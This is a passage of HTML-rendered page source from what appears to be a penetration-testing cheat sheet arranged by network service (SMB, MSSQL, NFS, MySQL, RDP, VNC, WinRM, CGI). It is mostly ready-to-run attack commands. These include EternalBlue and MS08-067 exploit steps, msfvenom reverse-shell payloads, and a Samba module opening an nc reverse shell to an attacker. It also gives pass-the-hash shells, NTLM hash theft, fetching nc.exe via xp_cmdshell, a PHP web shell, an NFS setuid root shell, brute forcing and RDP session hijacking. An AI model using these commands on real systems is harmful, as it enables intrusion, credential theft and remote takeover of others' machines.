tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span>\nsmbclient //<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span> -U <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"get-a-shell\">Get a shell</h3>\n<pre class=\"language-\"><code class=\"language-\">psexec.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\npsexec.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -hashes :<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NTHASH</span><span class=\"token punctuation\">></span></span>\n\nwmiexec.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nwmiexec.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -hashes :<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NTHASH</span><span class=\"token punctuation\">></span></span>\n\nsmbexec.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nsmbexec.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -hashes :<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NTHASH</span><span class=\"token punctuation\">></span></span>\n\natexec.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>COMMAND</span><span class=\"token punctuation\">></span></span>\natexec.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -hashes :<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NTHASH</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"eternalblue-ms17-010\">EternalBlue (MS17-010)</h3>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/3ndG4me/AutoBlue-MS17-010</code></pre><h4 id=\"check-if-vulnerable\">Check if vulnerable</h4>\n<pre class=\"language-\"><code class=\"language-\">python eternal_checker.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"prepare-shellcodes-and-listeners\">Prepare shellcodes and listeners</h4>\n<pre class=\"language-\"><code class=\"language-\">cd shellcode\n./shell_prep.sh\ncd ..\n./listener_prep.sh</code></pre><h4 id=\"exploit\">Exploit</h4>\n<pre class=\"language-\"><code class=\"language-\">python eternalblue_exploit<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NUMBER</span><span class=\"token punctuation\">></span></span>.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> shellcode/sc_all.bin\n\nMay need to run it multiple times</code></pre><h4 id=\"if-this-doesnt-work-try-this-one\">If this doesn&#39;t work, try this one</h4>\n<pre class=\"language-\"><code class=\"language-\">python zzz_exploit.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"ms08-067\">MS08-067</h3>\n<pre class=\"language-\"><code class=\"language-\"># Download exploit code\ngit clone https://github.com/andyacer/ms08_067.git\n\n# Generate payload\nmsfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows\nmsfvenom -p windows/shell_bind_tcp RHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows\n\n# Modify\nModify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.\n\n# Listener\nnc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Exploit\npython ms08_067_2018.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NUMBER</span><span class=\"token punctuation\">></span></span> 445</code></pre><h3 id=\"cve-2017-7494\">CVE-2017-7494</h3>\n<pre class=\"language-\"><code class=\"language-\"># Download exploit code\ngit clone https://github.com/joxeankoret/CVE-2017-7494</code></pre><p>Create a new file named poc.c :</p>\n<pre class=\"language-\"><code class=\"language-\">#include <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>stdio.h</span><span class=\"token punctuation\">></span></span>\n#include <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>stdlib.h</span><span class=\"token punctuation\">></span></span>\n\nint samba_init_module(void)\n{\n    setresuid(0,0,0);\n    system(\"ping -c 3 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\");\n}</code></pre><pre class=\"language-\"><code class=\"language-\"># Build\ngcc -o test.so -shared poc.c -fPIC</code></pre><pre class=\"language-\"><code class=\"language-\"># Start an ICMP listener\nsudo tcpdump -i <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>INTERFACE</span><span class=\"token punctuation\">></span></span> icmp\n\n# Exploit\n./cve_2017_7494.py -t <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>TARGET_IP</span><span class=\"token punctuation\">></span></span> -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span> --custom=test.so</code></pre><p>If you reiceve 3 pings on your listener then the exploit works. Now let&#39;s get a shell :</p>\n<pre class=\"language-\"><code class=\"language-\">#include <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>stdio.h</span><span class=\"token punctuation\">></span></span>\n#include <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>stdlib.h</span><span class=\"token punctuation\">></span></span>\n\nint samba_init_module(void)\n{\n    setresuid(0,0,0);\n    system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> >/tmp/f\");\n}</code></pre><pre class=\"language-\"><code class=\"language-\"># Build\ngcc -o test.so -shared poc.c -fPIC</code></pre><pre class=\"language-\"><code class=\"language-\"># Start a listener\nnc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Exploit\n./cve_2017_7494.py -t <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>TARGET_IP</span><span class=\"token punctuation\">></span></span> -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span> --custom=test.so</code></pre><hr>\n<h2 id=\"mssql---1433\">MSSQL - 1433</h2>\n<h3 id=\"get-information\">Get information</h3>\n<pre class=\"language-\"><code class=\"language-\">nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"brute-force-5\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">hydra -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> mssql -vV -I -u</code></pre><h3 id=\"having-credentials\">Having credentials</h3>\n<pre class=\"language-\"><code class=\"language-\">mssqlclient.py -windows-auth <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nmssqlclient.py <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\n\n# Once logged in you can run queries:\nSQL> select @@ version;\n\n# Steal NTLM hash\nsudo smbserver.py -smb2support liodeus .\nSQL> exec master..xp_dirtree '\\\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\\liodeus\\' # Steal the NTLM hash, crack it with john or hashcat\n\n# Try to enable code execution\nSQL> enable_xp_cmdshell\n\n# Execute code\nSQL> xp_cmdshell whoami /all\nSQL> xp_cmdshell certutil.exe -urlcache -split -f http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/nc.exe</code></pre><h3 id=\"manual-exploit\">Manual exploit</h3>\n<pre class=\"language-\"><code class=\"language-\">Cheatsheet :\n    - https://www.asafety.fr/mssql-injection-cheat-sheet/</code></pre><hr>\n<h2 id=\"nfs---2049\">NFS - 2049</h2>\n<h3 id=\"show-mountable-nfs-shares\">Show Mountable NFS Shares</h3>\n<pre class=\"language-\"><code class=\"language-\">showmount -e <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nnmap --script=nfs-showmount -oN mountable_shares <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"mount-a-share\">Mount a share</h3>\n<pre class=\"language-\"><code class=\"language-\">sudo mount -v -t nfs <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DIRECTORY</span><span class=\"token punctuation\">></span></span>\nsudo mount -v -t nfs -o vers=2 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DIRECTORY</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"nfs-misconfigurations\">NFS misconfigurations</h3>\n<pre class=\"language-\"><code class=\"language-\"># List exported shares\ncat /etc/exports</code></pre><p>If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.</p>\n<pre class=\"language-\"><code class=\"language-\"># Attacker, as root user\n\nmkdir <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DIRECTORY</span><span class=\"token punctuation\">></span></span>\nmount -v -t nfs <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DIRECTORY</span><span class=\"token punctuation\">></span></span>\ncd <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DIRECTORY</span><span class=\"token punctuation\">></span></span>\necho 'int main(void){setreuid(0,0); system(\"/bin/bash\"); return 0;}' > pwn.c\ngcc pwn.c -o pwn\nchmod +s pwn\n\n# Victim\n\ncd <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SHARE</span><span class=\"token punctuation\">></span></span>\n./pwn # Root shell</code></pre><hr>\n<h2 id=\"mysql---3306\">MYSQL - 3306</h2>\n<h3 id=\"brute-force-6\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">hydra -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> mysql -vV -I -u</code></pre><h3 id=\"extracting-mysql-credentials-from-files\">Extracting MySQL credentials from files</h3>\n<pre class=\"language-\"><code class=\"language-\">cat /etc/mysql/debian.cnf\ngrep -oaE \"[-_\\.\\*a-Z0-9]{3,}\" /var/lib/mysql/mysql/user.MYD | grep -v \"mysql_native_password\"</code></pre><h3 id=\"connect\">Connect</h3>\n<pre class=\"language-\"><code class=\"language-\"># Local\nmysql -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>\nmysql -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -p\n\n# Remote\nmysql -h <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"mysql-commands\">MySQL commands</h3>\n<pre class=\"language-\"><code class=\"language-\">show databases;\nuse <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DATABASES</span><span class=\"token punctuation\">></span></span>;\n\nshow tables;\ndescribe <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>TABLE</span><span class=\"token punctuation\">></span></span>;\n\nselect * from <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>TABLE</span><span class=\"token punctuation\">></span></span>;\n\n# Try to execute code\nselect do_system('id');\n\\! sh\n\n# Read &amp; Write\nselect load_file('<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span>');\nselect 1,2,\"<span class=\"token prolog\">&lt;?php echo shell_exec($_GET['c']);?></span>\",4 into OUTFILE '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>OUT_FILE</span><span class=\"token punctuation\">></span></span>'</code></pre><h3 id=\"manual-exploit-1\">Manual exploit</h3>\n<pre class=\"language-\"><code class=\"language-\">Cheatsheet :\n    - https://www.asafety.fr/mysql-injection-cheat-sheet/</code></pre><hr>\n<h2 id=\"rdp---3389\">RDP - 3389</h2>\n<h3 id=\"brute-force-7\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">crowbar -b rdp -s <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/CIDR -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -C <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span>\ncrowbar -b rdp -s <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/CIDR -U <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -C <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span>\n\nhydra -f -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> rdp://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u -vV</code></pre><h3 id=\"connect-with-known-credentials--hash\">Connect with known credentials / hash</h3>\n<pre class=\"language-\"><code class=\"language-\">rdesktop -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERNAME</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nrdesktop -d <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DOMAIN</span><span class=\"token punctuation\">></span></span> -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERNAME</span><span class=\"token punctuation\">></span></span> -p <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\n\nxfreerdp /u:[DOMAIN\\]<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERNAME</span><span class=\"token punctuation\">></span></span> /p:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span> /v:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nxfreerdp /u:[DOMAIN\\]<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERNAME</span><span class=\"token punctuation\">></span></span> /pth:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>HASH</span><span class=\"token punctuation\">></span></span> /v:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"session-stealing\">Session stealing</h3>\n<h4 id=\"get-openned-sessions\">Get openned sessions</h4>\n<pre class=\"language-\"><code class=\"language-\">query user</code></pre><h4 id=\"access-to-the-selected\">Access to the selected</h4>\n<pre class=\"language-\"><code class=\"language-\">tscon <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ID</span><span class=\"token punctuation\">></span></span> /dest:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SESSIONNAME</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"adding-user-to-rdp-group-windows\">Adding user to RDP group (Windows)</h3>\n<pre class=\"language-\"><code class=\"language-\">net localgroup \"Remote Desktop Users\" <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> /add</code></pre><hr>\n<h2 id=\"vnc---5800---58001---5900---5901\">VNC - 5800 - 58001 - 5900 - 5901</h2>\n<h3 id=\"scans-1\">Scans</h3>\n<pre class=\"language-\"><code class=\"language-\">nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"brute-force-8\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">hydra -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> -s <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> vnc -u -vV</code></pre><h3 id=\"connect-1\">Connect</h3>\n<pre class=\"language-\"><code class=\"language-\">vncviewer <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"found-vnc-password\">Found VNC password</h3>\n<h4 id=\"linux\">Linux</h4>\n<pre class=\"language-\"><code class=\"language-\">Default password is stored in: ~/.vnc/passwd</code></pre><h4 id=\"windows\">Windows</h4>\n<pre class=\"language-\"><code class=\"language-\"># RealVNC\nHKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\vncserver\n\n# TightVNC\nHKEY_CURRENT_USER\\Software\\TightVNC\\Server\n\n# TigerVNC\nHKEY_LOCAL_USER\\Software\\TigerVNC\\WinVNC4\n\n# UltraVNC\nC:\\Program Files\\UltraVNC\\ultravnc.ini</code></pre><h3 id=\"decrypt-vnc-password\">Decrypt VNC password</h3>\n<pre class=\"language-\"><code class=\"language-\">msfconsole\nirb\nfixedkey = \"\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\"\nrequire 'rex/proto/rfb'\nRex::Proto::RFB::Cipher.decrypt [\"2151D3722874AD0C\"].pack('H*'), fixedkey\n/dev/nul</code></pre><hr>\n<h2 id=\"winrm---5985---5986\">WINRM - 5985 - 5986</h2>\n<h3 id=\"brute-force-9\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">crackmapexec winrm <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -p <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"connecting\">Connecting</h3>\n<pre class=\"language-\"><code class=\"language-\">evil-winrm -i <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -p <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORD</span><span class=\"token punctuation\">></span></span>\nevil-winrm -i <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> -H <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>HASH</span><span class=\"token punctuation\">></span></span></code></pre><hr>\n<h2 id=\"cgi\">CGI</h2>\n<h3 id=\"found-cgi-scripts\">Found CGI scripts</h3>\n<pre class=\"language-\"><code class=\"language-\">ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>/ccgi-bin/FUZZ -t 50\nffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>/ccgi-bin/FUZZ -t 50\nffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100</code></pre><p>If a script is found try <a onclick=\"document.location.hash='shellshock';\" href=\"javascript:;\">SHELLSHOCK</a>.</p>\n<hr>\n<h2 id=\"command-and-control-framework\">Command and control 